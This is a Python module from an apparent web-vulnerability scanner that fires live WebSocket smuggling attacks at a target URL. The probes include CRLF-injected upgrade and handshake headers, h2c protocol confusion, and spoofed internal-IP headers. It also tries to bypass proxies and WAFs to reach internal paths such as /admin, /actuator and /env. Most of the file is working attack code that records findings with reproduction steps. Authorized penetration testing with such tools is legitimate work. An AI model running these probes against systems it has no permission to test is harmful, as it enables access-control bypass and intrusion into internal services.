"""
WebSocket Smuggling Attack Module
Tests for HTTP-to-WebSocket smuggling, protocol confusion, and upgrade hijacking.
One of the hottest vulnerability classes in 2024-2025.
"""
import asyncio
import ssl
import httpx
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


async def test_ws_smuggling(ws_url: str, fast_mode: bool = False) -> bool:
    """
    Test for WebSocket smuggling vulnerabilities:
    - Malformed Upgrade headers
    - HTTP/2 WebSocket confusion
    - Connection header stripping/smuggling
    - Protocol confusion attacks
    - Cross-protocol SSRF via Upgrade
    """
    results = []

    # Convert WS URL to HTTP for smuggling tests
    http_url = ws_url.replace('wss://', 'https://').replace('ws://', 'http://')

    # Test 1: Malformed Upgrade header smuggling
    await _test_malformed_upgrade(http_url, ws_url, results)

    # Test 2: Connection header smuggling
    await _test_connection_smuggling(http_url, ws_url, results)

    # Test 3: Protocol confusion
    if not fast_mode:
        await _test_protocol_confusion(http_url, ws_url, results)

    # Test 4: Upgrade header injection
    await _test_upgrade_injection(http_url, ws_url, results)

    # Test 5: Proxy bypass via WebSocket
    if not fast_mode:
        await _test_proxy_bypass(http_url, ws_url, results)

    # Test 6: Sec-WebSocket-Version manipulation
    await _test_version_manipulation(http_url, ws_url, results)

    return len(results) > 0


async def _test_malformed_upgrade(http_url: str, ws_url: str, results: list):
    """Test if server/proxy accepts malformed Upgrade headers"""
    malformed_headers_sets = [
        {'Upgrade': 'websocket, http/1.1',
         'desc': 'Double upgrade value'},
        {'Upgrade': 'WebSocket',
         'desc': 'Case variation (uppercase S)'},
        {'Upgrade': 'websocket\r\nX-Injected: evil',
         'desc': 'CRLF injection in Upgrade header'},
        {'Upgrade': 'WEBSOCKET',
         'desc': 'All-caps Upgrade value'},
        {'Upgrade': ' websocket ',
         'desc': 'Whitespace-padded Upgrade value'},
        {'Upgrade': 'websocket\x00',
         'desc': 'Null byte in Upgrade header'},
    ]

    async with httpx.AsyncClient(verify=False, timeout=8) as client:
        for entry in malformed_headers_sets:
            headers = {k: v for k, v in entry.items() if k != 'desc'}
            desc = entry['desc']
            try:
                r = await client.get(http_url, headers={
                    **headers,
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                })

                if r.status_code == 101 or 'websocket' in r.headers.get('upgrade', '').lower():
                    ev = Evidence.make(
                        payload=str(headers),
                        response=f'Status: {r.status_code}, Headers: {dict(r.headers)}',
                        proof=f'Server accepted malformed Upgrade header: {desc}',
                        reproduce=(
                            f"1. Send HTTP request to {http_url}\n"
                            f"2. Include malformed Upgrade header: {headers}\n"
                            f"3. Server responds with 101 Switching Protocols\n"
                            f"4. WebSocket connection established via smuggling"
                        )
                    )
                    store.add(ws_url, 'WebSocket Upgrade Smuggling', 'HIGH',
                        f"Server accepted malformed WebSocket Upgrade header.\n"
                        f"Technique: {desc}\n"
                        f"This can allow WebSocket connections through proxies/WAFs "
                        f"that should block them.", ev)
                    results.append('smuggling_upgrade')
                    return  # One finding is enough
            except Exception:
                pass


async def _test_connection_smuggling(http_url: str, ws_url: str, results: list):
    """Test if Connection header can be smuggled through proxies"""
    smuggle_headers_sets = [
        {'Connection': 'Upgrade, keep-alive',
         'Upgrade': 'websocket',
         'desc': 'Multi-value Connection header'},
        {'Connection': 'Upgrade',
         'Transfer-Encoding': 'chunked',
         'Upgrade': 'websocket',
         'desc': 'Connection + Transfer-Encoding combo'},
        {'Connection': 'close, Upgrade',
         'Upgrade': 'websocket',
         'desc': 'Contradictory Connection: close + Upgrade'},
        {'Connection': '\tUpgrade',
         'Upgrade': 'websocket',
         'desc': 'Tab-prefixed Connection header'},
    ]

    async with httpx.AsyncClient(verify=False, timeout=8) as client:
        for entry in smuggle_headers_sets:
            headers = {k: v for k, v in entry.items() if k != 'desc'}
            desc = entry['desc']
            try:
                r = await client.get(http_url, headers={
                    **headers,
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                })

                if r.status_code == 101:
                    ev = Evidence.make(
                        payload=str(headers),
                        response=f'Status: {r.status_code}',
                        proof=f'Connection header smuggling succeeded: {desc}',
                        reproduce=(
                            f"1. Send HTTP request to {http_url}\n"
                            f"2. Use smuggled Connection header: {desc}\n"
                            f"3. Server upgrades connection despite abnormal headers"
                        )
                    )
                    store.add(ws_url, 'WebSocket Connection Header Smuggling', 'HIGH',
                        f"Server accepts smuggled Connection headers.\n"
                        f"Technique: {desc}\n"
                        f"Proxies may fail to detect and block this WebSocket upgrade.", ev)
                    results.append('smuggling_connection')
                    return
            except Exception:
                pass


async def _test_protocol_confusion(http_url: str, ws_url: str, results: list):
    """Test for HTTP/1.1 to HTTP/2 protocol confusion via WebSocket upgrade"""
    confusion_tests = [
        {
            'method': 'POST',
            'headers': {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            'body': 'data=smuggled_request',
            'desc': 'POST with Upgrade + body (request smuggling)',
        },
        {
            'method': 'GET',
            'headers': {
                'Upgrade': 'h2c',
                'Connection': 'Upgrade, HTTP2-Settings',
                'HTTP2-Settings': 'AAMAAABkAAQCAAAAAAIAAAAA',
            },
            'body': None,
            'desc': 'HTTP/2 cleartext upgrade (h2c smuggling)',
        },
        {
            'method': 'GET',
            'headers': {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13',
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
            },
            'body': None,
            'desc': 'Upgrade with spoofed internal IP headers',
        },
    ]

    async with httpx.AsyncClient(verify=False, timeout=8) as client:
        for test in confusion_tests:
            try:
                if test['method'] == 'POST':
                    r = await client.post(http_url,
                        headers=test['headers'],
                        content=test['body'])
                else:
                    r = await client.get(http_url, headers=test['headers'])

                if r.status_code == 101 or r.status_code == 200:
                    resp_upgrade = r.headers.get('upgrade', '')
                    if 'websocket' in resp_upgrade.lower() or r.status_code == 101:
                        ev = Evidence.make(
                            payload=str(test['headers']),
                            response=f'Status: {r.status_code}, Upgrade: {resp_upgrade}',
                            proof=f'Protocol confusion succeeded: {test["desc"]}',
                            reproduce=(
                                f"1. Send {test['method']} to {http_url}\n"
                                f"2. Headers: {test['headers']}\n"
                                f"3. Server accepts upgrade — protocol confusion confirmed"
                            )
                        )
                        store.add(ws_url, 'WebSocket Protocol Confusion', 'CRITICAL',
                            f"Protocol confusion attack succeeded.\n"
                            f"Technique: {test['desc']}\n"
                            f"Attacker can bypass proxy restrictions and reach internal services.", ev)
                        results.append('smuggling_protocol_confusion')
                        return
            except Exception:
                pass


async def _test_upgrade_injection(http_url: str, ws_url: str, results: list):
    """Test for header injection via WebSocket upgrade"""
    injection_tests = [
        {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits=15\r\nX-Smuggled: true',
            'desc': 'CRLF injection via Sec-WebSocket-Extensions',
        },
        {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==\r\nX-Smuggled: true',
            'Sec-WebSocket-Version': '13',
            'desc': 'CRLF injection via Sec-WebSocket-Key',
        },
        {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Protocol': 'chat\r\nX-Smuggled: true',
            'desc': 'CRLF injection via Sec-WebSocket-Protocol',
        },
    ]

    async with httpx.AsyncClient(verify=False, timeout=8) as client:
        for test in injection_tests:
            desc = test.pop('desc')
            try:
                r = await client.get(http_url, headers=test)
                resp_headers = dict(r.headers)

                # Check if our injected header appeared in response
                if 'x-smuggled' in str(resp_headers).lower():
                    ev = Evidence.make(
                        payload=str(test),
                        response=f'Status: {r.status_code}, Headers: {resp_headers}',
                        proof=f'Header injection confirmed: {desc}',
                        reproduce=(
                            f"1. Send WebSocket upgrade to {http_url}\n"
                            f"2. Inject CRLF in WebSocket headers\n"
                            f"3. Injected X-Smuggled header appears in response"
                        )
                    )
                    store.add(ws_url, 'WebSocket Header Injection (CRLF)', 'CRITICAL',
                        f"CRLF injection via WebSocket handshake headers.\n"
                        f"Technique: {desc}\n"
                        f"Attacker can inject arbitrary HTTP headers via WS upgrade.", ev)
                    results.append('smuggling_header_injection')
                    return
            except Exception:
                pass
            finally:
                test['desc'] = desc


async def _test_proxy_bypass(http_url: str, ws_url: str, results: list):
    """Test if WebSocket upgrade can bypass proxy/WAF restrictions"""
    # Try to reach internal paths via WebSocket upgrade
    internal_paths = [
        '/admin', '/internal', '/api/internal', '/debug',
        '/healthcheck', '/metrics', '/status', '/env',
        '/_admin', '/server-status', '/actuator',
    ]

    from urllib.parse import urlparse
    parsed = urlparse(http_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    async with httpx.AsyncClient(verify=False, timeout=5) as client:
        for path in internal_paths:
            try:
                # First, try normal GET (should be blocked by proxy)
                r_normal = await client.get(base + path)

                # Then try with WebSocket upgrade headers
                r_upgrade = await client.get(base + path, headers={
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                })

                # If upgrade request gets different (more permissive) response
                if (r_normal.status_code in [403, 401, 404] and
                    r_upgrade.status_code in [101, 200, 301, 302]):
                    ev = Evidence.make(
                        payload=f'GET {base + path} with Upgrade: websocket',
                        response=f'Normal: {r_normal.status_code}, With Upgrade: {r_upgrade.status_code}',
                        proof=f'Proxy bypass via WebSocket upgrade on {path}',
                        reproduce=(
                            f"1. GET {base + path} → {r_normal.status_code} (blocked)\n"
                            f"2. GET {base + path} with Upgrade: websocket → {r_upgrade.status_code} (allowed)\n"
                            f"3. Proxy does not enforce restrictions on WebSocket upgrades"
                        )
                    )
                    store.add(ws_url, 'WebSocket Proxy Bypass', 'HIGH',
                        f"Internal path '{path}' accessible via WebSocket upgrade.\n"
                        f"Normal request: {r_normal.status_code} (blocked)\n"
                        f"WebSocket upgrade: {r_upgrade.status_code} (allowed)\n"
                        f"Proxy/WAF fails to enforce access controls on WS upgrades.", ev)
                    results.append('smuggling_proxy_bypass')
                    return
            except Exception:
                continue


async def _test_version_manipulation(http_url: str, ws_url: str, results: list):
    """Test server response to bad Sec-WebSocket-Version values"""
    bad_versions = [
        ('0', 'Version 0 (ancient)'),
        ('99', 'Version 99 (non-existent)'),
        ('-1', 'Negative version'),
        ('13, 8', 'Multiple versions'),
        ('', 'Empty version'),
        ('abc', 'Non-numeric version'),
    ]

    async with httpx.AsyncClient(verify=False, timeout=5) as client:
        accepted_bad = []
        for version, desc in bad_versions:
            try:
                headers = {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': version,
                }
                r = await client.get(http_url, headers=headers)

                if r.status_code == 101:
                    accepted_bad.append((version, desc))
            except Exception:
                pass

        if accepted_bad:
            samples = ', '.join(f'{v} ({d})' for v, d in accepted_bad[:3])
            ev = Evidence.make(
                payload=f'Bad versions accepted: {samples}',
                proof=f'Server accepted {len(accepted_bad)} invalid WebSocket versions',
                reproduce=(
                    f"1. Send WebSocket upgrade to {http_url}\n"
                    f"2. Use invalid Sec-WebSocket-Version values\n"
                    f"3. Server accepts upgrade without version validation"
                )
            )
            store.add(ws_url, 'WebSocket Version Validation Bypass', 'MEDIUM',
                f"Server accepts invalid WebSocket protocol versions.\n"
                f"Accepted: {samples}\n"
                f"This indicates missing protocol validation, "
                f"which may enable downgrade or smuggling attacks.", ev)
            results.append('smuggling_version')
